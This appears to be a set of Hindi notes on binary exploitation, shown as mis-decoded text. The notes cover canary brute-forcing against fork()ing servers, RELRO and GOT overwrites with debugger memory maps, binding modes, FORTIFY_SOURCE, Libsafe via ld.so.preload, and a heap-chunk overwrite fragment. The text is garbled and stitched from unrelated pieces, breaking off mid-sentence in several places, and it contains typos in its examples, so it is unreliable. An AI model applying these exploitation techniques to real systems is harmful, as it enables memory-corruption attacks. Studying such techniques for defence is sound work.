рдкреНрд░рддреНрдпреЗрдХ рдХрдХреНрд╖рд╛ рдХреЗ рдкрд╛рд╕ рдПрдХ **Vtable** рд╣реЛрддреА рд╣реИ рдЬреЛ **рд╡рд┐рдзрд┐рдпреЛрдВ рдХреЗ рд▓рд┐рдП рдкреЙрдЗрдВрдЯрд░реЛрдВ рдХрд╛
рдлрд╝рдВрдХреНрд╢рди fork() рдкрд┐рддрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреА рдПрдХ рд╕рдЯреАрдХ рдкреНрд░рддрд┐рд▓рд┐рдкрд┐ рдмрдирд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдПрдХ рд╡реЗрдм рд╕рд░реНрд╡рд░ fork() рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рддреЛ рдмрд╛рдЗрдЯ-рдмрд╛рдЗрдЯ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдЕрдЯреИрдХ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрдм рддрдХ рдХрд┐ рдХреИрдирд░реА рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рди рдЬрд╛ рд╕рдХреЗред

fork() рдХреЗ рдмрд╛рдж execve() рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╕реЗ, рд╕реНрдерд╛рди рдФрд░ рдЕрдЯреИрдХ рдЕрд╕рдВрднрд╡ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред vfork() рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдПрдХ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдмрдирд╛рдП рдмрд┐рдирд╛ рд╣реА рдЪрд▓рд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЬрдм рдмрдЪреНрдЪрд╛ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рддреА рд╣реИ, рддреЛ рд╡рд╣ рдбреБрдкреНрд▓рд┐рдХреЗрдЯ рдмрдирд╛рддрд╛ рд╣реИред

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** рдореЗрдореЛрд░реА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдкрд░ рдкреНрд░рднрд╛рд╡ рдбрд╛рд▓рддрд╛ рд╣реИ, NX рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдореЗрдВред рдЕрдВрддрд░ рдпрд╣ рд╣реИ рдХрд┐ NX рдХреЗ рд╕рд╛рде рд╕реНрдЯреИрдХ рдХреЛ рдХреНрд░рд┐рдпрд╛рд╢реАрд▓ рдмрдирд╛рддрд╛ рд╣реИ, рдЬрдмрдХрд┐ RELRO рдирд┐рд╢реНрдЪрд┐рдд рдЪреАрдЬреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╣рдо рдЙрдирдореЗрдВ рд╕реЗ рдХреБрдЫ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдореИрдВрдиреЗ рдЗрд╕реЗ рдПрдХ рдмрд╛рдзрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦрд╛ рд╣реИ рдХрд┐ рдпрд╣ рд╣рдореЗрдВ рдПрдХ got рддрд╛рд▓рд┐рдХрд╛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрддрд╛ рд╣реИ, рдЬрд┐рд╕рдХрд╛ рд╡рд┐рд╡рд░рдг рдмрд╛рдж рдореЗрдВ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред got рддрд╛рд▓рд┐рдХрд╛ рд▓рд┐рдмреНрд╕реА рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рд░рдЦрддреА рд╣реИ рддрд╛рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЛ рдкрддрд╛ рд╣реЛ рдХрд┐ рдкрддреЗ рдХреНрдпрд╛ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреЙрд▓ рдХрд░ рд╕рдХреЗред рдЪрд▓реЛ рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ relro рдХреЗ рд╕рд╛рде рдПрдХ рдмрд╛рдЗрдирд░реА рдХреЗ рд▓рд┐рдП got рддрд╛рд▓рд┐рдХрд╛ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдореЗрдореЛрд░реА рдЕрдиреБрдорддрд┐рдпрд╛рдБ рдХреИрд╕реА рд╣реЛрддреА рд╣реИрдВ рдФрд░ рдмрд┐рдирд╛ relro рдХреЗ рдХреИрд╕реА рд╣реЛрддреА рд╣реИрдВред

relro рдХреЗ рд╕рд╛рде:
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
рдмрд┐рдирд╛ relro:
```bash
gefтЮд  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefтЮд  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefтЮд  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  тЖТ   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
рдмрд┐рдирд░реА **relro рдХреЗ рдмрд┐рдирд╛** рдХреЗ рд▓рд┐рдП, рд╣рдо рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ `fgets` рдХреЗ рд▓рд┐рдП `got` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдкрддрд╛ `0x404018` рд╣реИред рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рдХреЛ рджреЗрдЦрдиреЗ рдкрд░ рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдпрд╣ `0x404000` рдФрд░ `0x405000` рдХреЗ рдмреАрдЪ рдореЗрдВ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдЕрдиреБрдорддрд┐рдпрд╛рдБ `rw`** рд╣реИрдВ, рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╣рдо рдЗрд╕реЗ рдкрдврд╝ рдФрд░ рд▓рд┐рдЦ рд╕рдХрддреЗ рд╣реИрдВред рдмрд┐рдирд░реА **relro рдХреЗ рд╕рд╛рде**, рд╣рдо рджреЗрдЦрддреЗ рд╣реИрдВ рдХрд┐ рдмрд╛рдЗрдирд░реА рдХреЗ рдЪрд▓рдиреЗ рдХреЗ рд▓рд┐рдП `got` рдЯреЗрдмрд▓ рдкрддрд╛ (рдкрд╛рдИ рд╕рдХреНрд╖рдо рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдкрддрд╛ рдмрджрд▓ рдЬрд╛рдПрдЧрд╛) `0x555555557fd0` рд╣реИред рдЙрд╕ рдмрд╛рдЗрдирд░реА рдХреА рдореЗрдореЛрд░реА рдореИрдкрд┐рдВрдЧ рдореЗрдВ рдпрд╣ `0x0000555555557000` рдФрд░ `0x0000555555558000` рдХреЗ рдмреАрдЪ рдЖрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ рдореЗрдореЛрд░реА **рдЕрдиреБрдорддрд┐ `r`** рд╣реИ, рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рд╣рдо рдЗрд╕рд╕реЗ рдХреЗрд╡рд▓ рдкрдврд╝ рд╕рдХрддреЗ рд╣реИрдВред

рддреЛ **рдмрд╛рдИрдкрд╛рд╕** рдХреНрдпрд╛ рд╣реИ? рдореИрдВ рдЖрдорддреМрд░ рдкрд░ рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрд╛рдИрдкрд╛рд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реВрдВ рдХрд┐ рд░реЗрд▓рд░реЛ рджреНрд╡рд╛рд░рд╛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░реЛрдВ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдирд╣реАрдВ рдХрд░реЗрдВ, рдФрд░ **рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдЕрд▓рдЧ рддрд░реАрдХрд╛ рдвреВрдВрдвреЗрдВ**ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕рдХреЗ рд▓рд┐рдП рдмрд╛рдЗрдирд░реА рдХреЛ рдкреНрд░рд╛рд░рдВрдн рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдкрддрд╛ рд╣реЛрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ:

* рдЖрд▓рд╕реА рдмрд╛рдЗрдВрдбрд┐рдВрдЧ: рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдХреЛ рдкрд╣рд▓реА рдмрд╛рд░ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдкрд░ рдЦреЛрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдЧреЙрдЯ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреЗ рджреМрд░рд╛рди рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред
* рдЕрдм рдмрд╛рдЗрдВрдб рдХрд░реЗрдВ: рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рдкрддреЗ рдХреЛ рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╣рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдлрд┐рд░ .got, .dtors, .ctors, .dynamic, .jcr рдЬреИрд╕реЗ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЦрдВрдбреЛрдВ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреА рдЬрд╛рддреА рд╣реИред `` `** ``-z relro`**`y`**`-z now\`\*\*

рдпрджрд┐ рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЕрдм рдмрд╛рдЗрдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдпрд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
рдЬрдм рдмрд╛рдЗрдирд░реА рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдкрд╣рд▓реА рдмрд╛рд░ рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT (Procedure Linkage Table) рдкрд░ рдЫрд▓рд╛рдВрдЧ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ, рдпрд╣рд╛рдВ рд╕реЗ рдПрдХ рдЫрд▓рд╛рдВрдЧ (jmp) рдЬреАрдУрдЯреА (GOT) рдкрд░ рд▓рдЧрд╛рдИ рдЬрд╛рддреА рд╣реИ рдФрд░ рдкрддрд╛ рдЪрд▓рддрд╛ рд╣реИ рдХрд┐ рдпрд╣ рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рд╣рд▓ рдирд╣реАрдВ рд╣реБрдИ рд╣реИ (рдпрд╣ PLT рдХреЗ рдЕрдЧрд▓реЗ рдкрддреЗ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИ)ред рдЗрд╕рд▓рд┐рдП рдпрд╣ рд░рдирдЯрд╛рдЗрдо рд▓рд┐рдВрдХрд░ рдпрд╛ рдЖрд░рдЯреАрдПрдлрдбреА рдХреЛ рдмреБрд▓рд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХреЗ рдФрд░ рдЙрд╕реЗ рдЬреАрдУрдЯреА рдореЗрдВ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдХреЗ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд╕рдХреЗред

рдЬрдм рдПрдХ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PLT рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рдиреЗ рд╡рд╛рд▓реА рдЬреАрдУрдЯреА рдХрд╛ рдкрддрд╛ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдВ рдлреНрд▓реЛ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рддрд░рд╣ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЕрдЧрд░ рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рд╣реИ рдЬрдм рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЬреАрдУрдЯреА рдореЗрдВ рд╡рд╣рд╛рдВ рдХреНрдпрд╛ рд╣реИ, рд╡рд╣ PLT рдХреЗ рдЕрдЧрд▓реЗ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдлрд╝реНрд▓реЛ рдХреЛрдб (рдЖрд░рдЯреАрдПрдлрдбреА) рдХрд╛ рдкрд╛рд▓рди рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рддрд╛ рд╣реИ, рдЗрд╕реЗ рдЬреАрдУрдЯреА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░рддрд╛ рд╣реИ рдФрд░ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред

рдмрд╛рдЗрдирд░реА рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдХрдВрдкрд╛рдЗрд▓рд░ рдиреЗ рдЗрд╕реЗ рдмрддрд╛рдпрд╛ рд╣реИ рдХрд┐ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдЪрд▓рд╛рдиреЗ рдкрд░ рд▓реЛрдб рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ рдХрд┐рд╕ рдСрдлрд╝рд╕реЗрдЯ рдкрд░ рд╕реНрдерд╛рдирд┐рдд рдХрд░рдирд╛ рд╣реИред

рд▓реЗрдЬреА рдмрд╛рдЗрдВрдбрд┐рдВрдЧ -> рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдкрддрд╛ рдкрд╣рд▓реА рдмрд╛рд░ рдЬрдм рдмреБрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЬреАрдУрдЯреА рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП рдЬреАрдУрдЯреА рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИ рдФрд░ рдлрд┐рд░ рд╕реЗ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИред

рдЕрдм рдмрд╛рдЗрдВрдб -> рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдкрддреЗ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд▓реЛрдб рдХрд░рддреЗ рд╕рдордп рдЦреЛрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВ рдФрд░ рд╕реЗрдХреНрд╢рди .got, .dtors, .ctors, .dynamic, .jcr рдХреА рдЕрдиреБрдорддрд┐ рдХреЛ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдпреЛрдЧреНрдп рдмрдирд╛рддреЗ рд╣реИрдВред -z relro рдФрд░ -z now

рдЗрд╕рдХреЗ рдмрд╛рд╡рдЬреВрдж, рдЖрдорддреМрд░ рдкрд░ рдкреНрд░реЛрдЧреНрд░рд╛рдореЛрдВ рдореЗрдВ рдЗрди рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЗ рд╕рд╛рде рдЬрдЯрд┐рд▓ рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП рдпреЗ рд╣рдорд▓реЗ рдЕрднреА рднреА рд╕рдВрднрд╡ рд╣реИрдВред

readelf -l /proc/ID_PROC/exe | grep BIND_NOW -> рдпрд╣ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдХреНрдпрд╛ рд╡реЗ BIND NOW рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ

Fortify Source -D_FORTIFY_SOURCE=1 рдпрд╛ =2

рдПрдХ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рддрд░реАрдХреЗ рд╕реЗ рдПрдХ рд╕реНрдерд╛рди рд╕реЗ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди рдкрд░ рдХреЙрдкреА рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлрд╝рдВрдХреНрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдФрд░ рдЙрд╕реЗ рдПрдХ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рд╕реЗ рдмрджрд▓реЗрдВред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:\
char buf[16];\
strcpy(but, source);

рдЗрд╕реЗ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ strcpy() рдХреЛ __strcpy_chk() рд╕реЗ рдмрджрд▓ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд╣рд╛рдВ рдмрдлрд░ рдХрд╛ рдЖрдХрд╛рд░ рдЕрдзрд┐рдХрддрдо рдХреЙрдкреА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рд╣реЛрддрд╛ рд╣реИред

=1 рдФрд░ =2 рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рд╣реИ рдХрд┐:

рджреВрд╕рд░рд╛ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрддрд╛ рд╣реИ рдХрд┐ %n рд▓реЗрдЦрди рдпреЛрдЧреНрдп рд╕реЗрдХреНрд╢рди рд╕реЗ рдЖрдПред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рддрд╛рддреНрдХрд╛рд▓рд┐рдХ рддрд░реАрдХреЗ рд╕реЗ рдкрд╣реБрдВрдЪ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗрд╡рд▓ рдкрд┐рдЫрд▓реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдпрджрд┐ рдкрд╣рд▓реЗ %2$d рдФрд░ %1$d рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП argv[0] рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЗрд╕реЗ рджреВрд╕рд░реЗ рд╕реНрдерд╛рди (рдЬреИрд╕реЗ рдПрдХ рдЧреНрд▓реЛрдмрд▓ рдЪрд░) рдХреЗ рдкрддреЗ рдореЗрдВ рд░рдЦрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЙрд╕ рдЪрд░ рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░реЗрдЧрд╛ред рдкреГрд╖реНрда 191

Libsafe рдХреА рдЬрдЧрд╣ рдмрджрд▓реЗрдВ

рдЗрд╕рдХреЗ рд╕рд╛рде рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ: LD_PRELOAD=/lib/libsafe.so.2\
рдпрд╛\
"/lib/libsave.so.2" > /etc/ld.so.preload

рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рдиреЛрдВ рдХреЗ рд▓рд┐рдП рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдорд╛рдирдХреАрдХреГрдд рдирд╣реАрдВ рд╣реИред (рдХреЗрд╡рд▓ x86 рдХреЗ рд▓рд┐рдП, -fomit-frame-pointer рдХреЗ рд╕рд╛рде рдХрдВрдкрд╛рдЗрд▓реЗрд╢рди рдХреЗ рд▓
рд╢реИрд▓ рдХреЛрдб рдХреЗ рдмрд╛рдж, рд╣рдо рдЕрдЧрд▓реЗ рдЪрдВрдХ рдХреЗ prev_size рдФрд░ size рдлрд╝реАрд▓реНрдб рддрдХ рднрд░рд╛рдИ рдХрд░рддреЗ рд╣реИрдВред рдЗрди рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╣рдо 0xfffffff0 (рдЬрд┐рд╕рд╕реЗ prev_size рдХреЛ рдлреНрд░реА рд╣реЛрдиреЗ рдХрд╛ рдмрд┐рдЯ рд╣реЛрддрд╛ рд╣реИ) рдФрд░ " -4 " (0xfffffffc) size рдореЗрдВ рдбрд╛рд▓рддреЗ рд╣реИрдВ (рддрд╛рдХрд┐ рдЬрдм рддреАрд╕рд░реЗ рдЪрдВрдХ рдореЗрдВ рджреЗрдЦреЗрдВ рдХрд┐ рдХреНрдпрд╛ рджреВрд╕рд░рд╛ рдЪрдВрдХ рдлреНрд░реА рд╣реИ, рддреЛ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд prev_size рдкрд░ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рдХрд╣реЗрдЧрд╛ рдХрд┐ рджреВрд╕рд░рд╛ рдЪрдВрдХ рдлреНрд░реА рд╣реИ) -> рдЗрд╕ 